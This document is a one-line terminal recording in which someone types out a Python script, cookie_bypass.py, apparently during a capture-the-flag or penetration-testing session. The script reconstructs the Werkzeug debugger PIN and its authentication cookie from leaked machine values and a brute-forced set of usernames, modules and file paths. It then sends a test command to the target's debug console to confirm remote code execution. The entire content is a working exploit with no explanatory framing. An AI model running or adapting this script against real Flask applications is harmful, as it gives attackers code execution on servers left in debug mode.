[1178.766945, "i", "cat << 'EOF' > cookie_bypass.py\nimport hashlib\nimport requests\nfrom itertools import chain\n\nboot_id = 'df37f78a-cf41-4eae-9e39-a834a92a596a'\nmac = '2485377892356'\n\nusernames = ['root', 'app', 'www-data', 'werkzeug', 'nobody', 'admin']\nmodnames = ['flask.app', 'werkzeug.debug', '__main__', 'app']\nappnames = ['Flask', 'DebuggedApplication', 'wsgi_app']\nmodfiles = [\n    '/usr/local/lib/python3.11/site-packages/flask/app.py',\n    '/usr/local/lib/python3.11/site-packages/werkzeug/debug/__init__.py',\n    '/usr/lib/python3.11/site-packages/flask/app.py',\n    '/usr/lib/python3.11/site-packages/werkzeug/debug/__init__.py',\n    '/app/app.py', '/app/main.py', '/app/run.py',\n]\n\nmachine_ids = [boot_id, boot_id + '0::/', ''] \n\nsecret = 'cROx4oCXXz5PA5qlhIU3'\nurl = 'http://target:8127/console'\n\ns = requests.Session()\ns.headers.update({\"Host\": \"localhost\"})\n\ndef check_cookie(cookie_name, cookie_val):\n    r = s.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('PWN1337')\", \"frm\": \"0\", \"s\": secret}, cookies={cookie_name: cookie_val})\n    if 'PWN1337' in r.text and r.status_code == 200:\n        return True\n    return False\n\nfor u in usernames:\n  for m1 in modnames:\n    for m2 in appnames:\n      for m3 in modfiles:\n        for mid in machine_ids:\n            h = hashlib.sha1()\n            for bit in chain([u, m1, m2, m3], [mac, mid]):\n                if not bit: continue\n                if isinstance(bit, str): bit = bit.encode('utf-8')\n                h.update(bit)\n            h.update(b'cookiesalt')\n            cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n            \n            h.update(b'pinsalt')\n            num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n            pin = f\"{num[:3]}-{num[3:6]}-{num[6:9]}\"\n            \n            cookie_val = hashlib.sha1(f\"{pin} pallets\".encode('utf-8')).hexdigest()\n            if check_cookie(cookie_name, cookie_val):\n                print(f\"\\n[!] EXPLOIT SUCCESSFUL!\")\n                print(f\"Pin: {pin}\\nCookie Name: {cookie_name}\\nCookie Val: {cookie_val}\")\n                print(f\"Combo: {u}, {m1}, {m2}, {m3}, {mid}\")\n                exit(0)\n\nprint(\"Exploit failed.\")\nEOF\n"]
